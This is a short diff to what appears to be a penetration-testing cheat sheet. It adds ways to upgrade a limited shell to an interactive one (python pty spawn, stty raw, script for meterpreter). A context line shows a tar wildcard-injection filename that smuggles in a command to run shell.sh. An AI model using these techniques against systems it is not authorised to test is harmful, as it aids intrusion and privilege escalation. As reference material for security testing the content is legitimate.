@@ -92,13 +92,16 @@ echo > '--checkpoint-action=exec=sh shell.sh'
 
 ```shell
 python3 -c "import pty; pty.spawn('/bin/bash')"
+# or
+python -c "import pty; pty.spawn('/bin/bash')"
+# then
 export TERM=xterm
 # Press -> Ctrl + Z
 stty raw -echo; fg
-
+--------------------------------
 #if there is no python installed
 /bin/bash -i
-
+--------------------------------
 #if you are on a meterpreter
 SHELL=/bin/bash script -q /dev/null
 ```
